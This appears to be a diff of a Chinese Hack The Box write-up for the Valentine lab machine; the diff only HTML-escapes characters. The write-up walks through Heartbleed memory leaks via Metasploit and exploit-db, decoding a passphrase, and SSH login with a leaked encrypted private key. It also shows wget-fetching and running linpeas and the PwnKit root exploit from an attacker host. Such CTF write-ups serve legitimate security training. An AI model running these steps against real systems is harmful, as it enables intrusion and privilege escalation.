@@ -1,7 +1,7 @@
 # HTB靶机 012 Valentine WriteUp
 
 
-<!--more-->
+&lt;!--more--&gt;
 
 # 012-Valentine
 
@@ -126,7 +126,7 @@ Nmap done: 1 IP address (1 host up) scanned in 1181.61 seconds
 ```shell
 ┌──(xavier㉿kali)-[~]
 └─$ msfconsole                                                                              
-msf6 > search heartbleed
+msf6 &gt; search heartbleed
 
 Matching Modules
 ================
@@ -139,17 +139,17 @@ Matching Modules
 
 Interact with a module by name or index. For example info 1, use 1 or use auxiliary/scanner/ssl/openssl_heartbleed
 
-msf6 > use auxiliary/scanner/ssl/openssl_heartbleed 
-msf6 auxiliary(scanner/ssl/openssl_heartbleed) > set RHOSTS 10.10.10.79
-RHOSTS => 10.10.10.79
-msf6 auxiliary(scanner/ssl/openssl_heartbleed) > run
+msf6 &gt; use auxiliary/scanner/ssl/openssl_heartbleed 
+msf6 auxiliary(scanner/ssl/openssl_heartbleed) &gt; set RHOSTS 10.10.10.79
+RHOSTS =&gt; 10.10.10.79
+msf6 auxiliary(scanner/ssl/openssl_heartbleed) &gt; run
 
-[+] 10.10.10.79:443       - Heartbeat response with leak, 65535 bytes
+[&#43;] 10.10.10.79:443       - Heartbeat response with leak, 65535 bytes
 [*] 10.10.10.79:443       - Scanned 1 of 1 hosts (100% complete)
 [*] Auxiliary module execution completed
-msf6 auxiliary(scanner/ssl/openssl_heartbleed) > set VERBOSE True
-VERBOSE => true
-msf6 auxiliary(scanner/ssl/openssl_heartbleed) > exploit
+msf6 auxiliary(scanner/ssl/openssl_heartbleed) &gt; set VERBOSE True
+VERBOSE =&gt; true
+msf6 auxiliary(scanner/ssl/openssl_heartbleed) &gt; exploit
 
 [*] 10.10.10.79:443       - Leaking heartbeat response #1
 [*] 10.10.10.79:443       - Sending Client Hello...
@@ -177,10 +177,10 @@ msf6 auxiliary(scanner/ssl/openssl_heartbleed) > exploit
 --------------------------------------------------------------------------------------------------------- ---------------------------------
  Exploit Title                                                                                           |  Path
 --------------------------------------------------------------------------------------------------------- ---------------------------------
-OpenSSL 1.0.1f TLS Heartbeat Extension - 'Heartbleed' Memory Disclosure (Multiple SSL/TLS Versions)      | multiple/remote/32764.py
-OpenSSL TLS Heartbeat Extension - 'Heartbleed' Information Leak (1)                                      | multiple/remote/32791.c
-OpenSSL TLS Heartbeat Extension - 'Heartbleed' Information Leak (2) (DTLS Support)                       | multiple/remote/32998.c
-OpenSSL TLS Heartbeat Extension - 'Heartbleed' Memory Disclosure                                         | multiple/remote/32745.py
+OpenSSL 1.0.1f TLS Heartbeat Extension - &#39;Heartbleed&#39; Memory Disclosure (Multiple SSL/TLS Versions)      | multiple/remote/32764.py
+OpenSSL TLS Heartbeat Extension - &#39;Heartbleed&#39; Information Leak (1)                                      | multiple/remote/32791.c
+OpenSSL TLS Heartbeat Extension - &#39;Heartbleed&#39; Information Leak (2) (DTLS Support)                       | multiple/remote/32998.c
+OpenSSL TLS Heartbeat Extension - &#39;Heartbleed&#39; Memory Disclosure                                         | multiple/remote/32745.py
 --------------------------------------------------------------------------------------------------------- ---------------------------------
 Shellcodes: No Results
 ```
@@ -190,7 +190,7 @@ Shellcodes: No Results
 ```shell
 ┌──(xavier㉿kali)-[~/Desktop/HTB/012-Valentine]
 └─$ searchsploit -m multiple/remote/32764.py
-  Exploit: OpenSSL 1.0.1f TLS Heartbeat Extension - 'Heartbleed' Memory Disclosure (Multiple SSL/TLS Versions)
+  Exploit: OpenSSL 1.0.1f TLS Heartbeat Extension - &#39;Heartbleed&#39; Memory Disclosure (Multiple SSL/TLS Versions)
       URL: https://www.exploit-db.com/exploits/32764
      Path: /usr/share/exploitdb/exploits/multiple/remote/32764.py
     Codes: CVE-2014-0346, CVE-2014-0160, OSVDB-105465
@@ -226,8 +226,8 @@ Sending heartbeat request...
  ... received message: type = 24, ver = 0300, length = 16384
 Received heartbeat response:
   0000: 02 40 00 D8 03 00 53 43 5B 90 9D 9B 72 0B BC 0C  .@....SC[...r...
-  0010: BC 2B 92 A8 48 97 CF BD 39 04 CC 16 0A 85 03 90  .+..H...9.......
-  0020: 9F 77 04 33 D4 DE 00 00 66 C0 14 C0 0A C0 22 C0  .w.3....f.....".
+  0010: BC 2B 92 A8 48 97 CF BD 39 04 CC 16 0A 85 03 90  .&#43;..H...9.......
+  0020: 9F 77 04 33 D4 DE 00 00 66 C0 14 C0 0A C0 22 C0  .w.3....f.....&#34;.
   0030: 21 00 39 00 38 00 88 00 87 C0 0F C0 05 00 35 00  !.9.8.........5.
 ```
 
@@ -245,7 +245,7 @@ Received heartbeat response:
 
 ```shell
 ┌──(xavier㉿kali)-[~]
-└─$ echo "aGVhcnRibGVlZGJlbGlldmV0aGVoeXBlCg==" | base64 -d
+└─$ echo &#34;aGVhcnRibGVlZGJlbGlldmV0aGVoeXBlCg==&#34; | base64 -d
 heartbleedbelievethehype
 ```
 
@@ -261,7 +261,7 @@ heartbleedbelievethehype
 Target: https://10.10.10.79/
 
 [16:14:19] Starting: 
-[16:15:27] 301 -  310B  - /dev  ->  https://10.10.10.79/dev/  
+[16:15:27] 301 -  310B  - /dev  -&gt;  https://10.10.10.79/dev/  
 [16:15:27] 200 -    1KB - /dev/
 [16:15:39] 200 -   38B  - /index.php  
 ```
@@ -279,7 +279,7 @@ To do:
 2) Research.
 3) Fix decoder/encoder before going live.
 4) Make sure encoding/decoding is only done client-side.
-5) Don't use the decoder/encoder until any of this is done.
+5) Don&#39;t use the decoder/encoder until any of this is done.
 6) Find a better way to take notes.
 ```
 
@@ -303,30 +303,30 @@ Proc-Type: 4,ENCRYPTED
 DEK-Info: AES-128-CBC,AEB88C140F69BF2074788DE24AE48D46
 
 DbPrO78kegNuk1DAqlAN5jbjXv0PPsog3jdbMFS8iE9p3UOL0lF0xf7PzmrkDa8R
-5y/b46+9nEpCMfTPhNuJRcW2U2gJcOFH+9RJDBC5UJMUS1/gjB/7/My00Mwx+aI6
+5y/b46&#43;9nEpCMfTPhNuJRcW2U2gJcOFH&#43;9RJDBC5UJMUS1/gjB/7/My00Mwx&#43;aI6
 0EI0SbOYUAV1W4EV7m96QsZjrwJvnjVafm6VsKaTPBHpugcASvMqz76W6abRZeXi
-Ebw66hjFmAu4AzqcM/kigNRFPYuNiXrXs1w/deLCqCJ+Ea1T8zlas6fcmhM8A+8P
+Ebw66hjFmAu4AzqcM/kigNRFPYuNiXrXs1w/deLCqCJ&#43;Ea1T8zlas6fcmhM8A&#43;8P
 OXBKNe6l17hKaT6wFnp5eXOaUIHvHnvO6ScHVWRrZ70fcpcpimL1w13Tgdd2AiGd
-pHLJpYUII5PuO6x+LS8n1r/GWMqSOEimNRD1j/59/4u3ROrTCKeo9DsTRqs2k1SH
-QdWwFwaXbYyT1uxAMSl5Hq9OD5HJ8G0R6JI5RvCNUQjwx0FITjjMjnLIpxjvfq+E
-p0gD0UcylKm6rCZqacwnSddHW8W3LxJmCxdxW5lt5dPjAkBYRUnl91ESCiD4Z+uC
+pHLJpYUII5PuO6x&#43;LS8n1r/GWMqSOEimNRD1j/59/4u3ROrTCKeo9DsTRqs2k1SH
+QdWwFwaXbYyT1uxAMSl5Hq9OD5HJ8G0R6JI5RvCNUQjwx0FITjjMjnLIpxjvfq&#43;E
+p0gD0UcylKm6rCZqacwnSddHW8W3LxJmCxdxW5lt5dPjAkBYRUnl91ESCiD4Z&#43;uC
 Ol6jLFD2kaOLfuyee0fYCb7GTqOe7EmMB3fGIwSdW8OC8NWTkwpjc0ELblUa6ulO
-t9grSosRTCsZd14OPts4bLspKxMMOsgnKloXvnlPOSwSpWy9Wp6y8XX8+F40rxl5
+t9grSosRTCsZd14OPts4bLspKxMMOsgnKloXvnlPOSwSpWy9Wp6y8XX8&#43;F40rxl5
 XqhDUBhyk1C3YPOiDuPOnMXaIpe1dgb0NdD1M9ZQSNULw1DHCGPP4JSSxX7BWdDK
 aAnWJvFglA4oFBBVA8uAPMfV2XFQnjwUT5bPLC65tFstoRtTZ1uSruai27kxTnLQ
-+wQ87lMadds1GQNeGsKSf8R/rsRKeeKcilDePCjeaLqtqxnhNoFtg0Mxt6r2gb1E
+&#43;wQ87lMadds1GQNeGsKSf8R/rsRKeeKcilDePCjeaLqtqxnhNoFtg0Mxt6r2gb1E
 AloQ6jg5Tbj5J7quYXZPylBljNp9GVpinPc3KpHttvgbptfiWEEsZYn5yZPhUr9Q
-r08pkOxArXE2dj7eX+bq65635OJ6TqHbAlTQ1Rs9PulrS7K4SLX7nY89/RZ5oSQe
-2VWRyTZ1FfngJSsv9+Mfvz341lbzOIWmk7WfEcWcHc16n9V0IbSNALnjThvEcPky
+r08pkOxArXE2dj7eX&#43;bq65635OJ6TqHbAlTQ1Rs9PulrS7K4SLX7nY89/RZ5oSQe
+2VWRyTZ1FfngJSsv9&#43;Mfvz341lbzOIWmk7WfEcWcHc16n9V0IbSNALnjThvEcPky
 e1BsfSbsf9FguUZkgHAnnfRKkGVG1OVyuwc/LVjmbhZzKwLhaZRNd8HEM86fNojP
-09nVjTaYtWUXk0Si1W02wbu1NzL+1Tg9IpNyISFCFYjSqiyG+WU7IwK3YU5kp3CC
+09nVjTaYtWUXk0Si1W02wbu1NzL&#43;1Tg9IpNyISFCFYjSqiyG&#43;WU7IwK3YU5kp3CC
 dYScz63Q2pQafxfSbuv4CMnNpdirVKEo5nRRfK/iaL3X1R3DxV8eSYFKFL6pqpuX
-cY5YZJGAp+JxsnIQ9CFyxIt92frXznsjhlYa8svbVNNfk/9fyX6op24rL2DyESpY
-pnsukBCFBkZHWNNyeN7b5GhTVCodHhzHVFehTuBrp+VuPqaqDvMCVe1DZCb4MjAj
-Mslf+9xK+TXEL3icmIOBRdPyw6e/JlQlVRlmShFpI8eb/8VsTyJSe+b853zuV2qL
-suLaBMxYKm3+zEDIDveKPNaaWZgEcqxylCC/wUyUXlMJ50Nw6JNVMM8LeCii3OEW
+cY5YZJGAp&#43;JxsnIQ9CFyxIt92frXznsjhlYa8svbVNNfk/9fyX6op24rL2DyESpY
+pnsukBCFBkZHWNNyeN7b5GhTVCodHhzHVFehTuBrp&#43;VuPqaqDvMCVe1DZCb4MjAj
+Mslf&#43;9xK&#43;TXEL3icmIOBRdPyw6e/JlQlVRlmShFpI8eb/8VsTyJSe&#43;b853zuV2qL
+suLaBMxYKm3&#43;zEDIDveKPNaaWZgEcqxylCC/wUyUXlMJ50Nw6JNVMM8LeCii3OEW
 l0ln9L1b/NXpHjGa8WHHTjoIilB5qNUyywSeTBF2awRlXH9BrkZG4Fc4gdmW/IzT
-RUgZkbMQZNIIfzj1QuilRVBm/F76Y/YMrmnM9k/1xSGIskwCUQ+95CGHJE8MkhD3
+RUgZkbMQZNIIfzj1QuilRVBm/F76Y/YMrmnM9k/1xSGIskwCUQ&#43;95CGHJE8MkhD3
 -----END RSA PRIVATE KEY----- 
 ```
 
@@ -338,14 +338,14 @@ RUgZkbMQZNIIfzj1QuilRVBm/F76Y/YMrmnM9k/1xSGIskwCUQ+95CGHJE8MkhD3
 
 ```shell
 ┌──(xavier㉿kali)-[~/Desktop/HTB/012-Valentine]
-└─$ xxd -r -p hype_key > hype_key.rsa
+└─$ xxd -r -p hype_key &gt; hype_key.rsa
 
 ┌──(xavier㉿kali)-[~/Desktop/HTB/012-Valentine]
 └─$ chmod 600 hype_key.rsa
 
 ┌──(xavier㉿kali)-[~/Desktop/HTB/012-Valentine]
 └─$ ssh -i hype_key.rsa hype@10.10.10.79
-Enter passphrase for key 'hype_key.rsa': 
+Enter passphrase for key &#39;hype_key.rsa&#39;: 
 ```
 
 这里私钥有密码，想到了之前decode中获取的字符串：heartbleedbelievethehype
@@ -353,23 +353,23 @@ Enter passphrase for key 'hype_key.rsa':
 ```shell
 ┌──(xavier㉿kali)-[~/Desktop/HTB/012-Valentine]
 └─$ ssh -i hype_key.rsa hype@10.10.10.79
-Enter passphrase for key 'hype_key.rsa': 
+Enter passphrase for key &#39;hype_key.rsa&#39;: 
 sign_and_send_pubkey: no mutual signature supported
-hype@10.10.10.79's password: 
+hype@10.10.10.79&#39;s password: 
 ```
 
-这里有个报错，因为新版本的ssh不再支持一些弱加密算法，所以如果要用的话需要手动指定`-o PubkeyAcceptedKeyTypes=+ssh-rsa`。
+这里有个报错，因为新版本的ssh不再支持一些弱加密算法，所以如果要用的话需要手动指定`-o PubkeyAcceptedKeyTypes=&#43;ssh-rsa`。
 
 ```shell
 ┌──(xavier㉿kali)-[~/Desktop/HTB/012-Valentine]
-└─$ ssh -i hype_key.rsa hype@10.10.10.79 -o PubkeyAcceptedKeyTypes=+ssh-rsa
-Enter passphrase for key 'hype_key.rsa': 
+└─$ ssh -i hype_key.rsa hype@10.10.10.79 -o PubkeyAcceptedKeyTypes=&#43;ssh-rsa
+Enter passphrase for key &#39;hype_key.rsa&#39;: 
 Welcome to Ubuntu 12.04 LTS (GNU/Linux 3.2.0-23-generic x86_64)
 
  * Documentation:  https://help.ubuntu.com/
 
-New release '14.04.5 LTS' available.
-Run 'do-release-upgrade' to upgrade to it.
+New release &#39;14.04.5 LTS&#39; available.
+Run &#39;do-release-upgrade&#39; to upgrade to it.
 
 Last login: Fri Feb 16 14:50:29 2018 from 10.10.14.3
 hype@Valentine:~$ id
@@ -381,8 +381,8 @@ hype@Valentine:~$
 
 ```shell
 Host *
-    PubkeyAcceptedKeyTypes=+ssh-rsa
-    HostKeyAlgorithms=+ssh-rsa
+    PubkeyAcceptedKeyTypes=&#43;ssh-rsa
+    HostKeyAlgorithms=&#43;ssh-rsa
 ```
 
 ![image-20230429170722849](resource/012-Valentine.assets/image-20230429170722849.png)
@@ -398,12 +398,12 @@ Host *
 ┌──(xavier㉿kali)-[~/Desktop/HTB/tools]
 └─$ python3 -m http.server 80
 Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
-10.10.10.79 - - [29/Apr/2023 17:10:53] "GET /linpeas.sh HTTP/1.1" 200 -
+10.10.10.79 - - [29/Apr/2023 17:10:53] &#34;GET /linpeas.sh HTTP/1.1&#34; 200 -
 
 # Victim
 hype@Valentine:/tmp$ wget http://10.10.14.22/linpeas.sh
-hype@Valentine:/tmp$ chmod +x linpeas.sh
-hype@Valentine:/tmp$ ./linpeas.sh > result.txt
+hype@Valentine:/tmp$ chmod &#43;x linpeas.sh
+hype@Valentine:/tmp$ ./linpeas.sh &gt; result.txt
 ```
 
 利用同样的方式，再把result.txt下载到本地
@@ -416,7 +416,7 @@ hype@Valentine:/tmp$ ./linpeas.sh > result.txt
 
 ```shell
 hype@Valentine:/tmp$ wget http://10.10.14.22/PwnKit
-hype@Valentine:/tmp$ chmod +x PwnKit 
+hype@Valentine:/tmp$ chmod &#43;x PwnKit 
 hype@Valentine:/tmp$ ./PwnKit 
 root@Valentine:/tmp# id  
 uid=0(root) gid=0(root) groups=0(root),24(cdrom),30(dip),46(plugdev),124(sambashare),1000(hype)
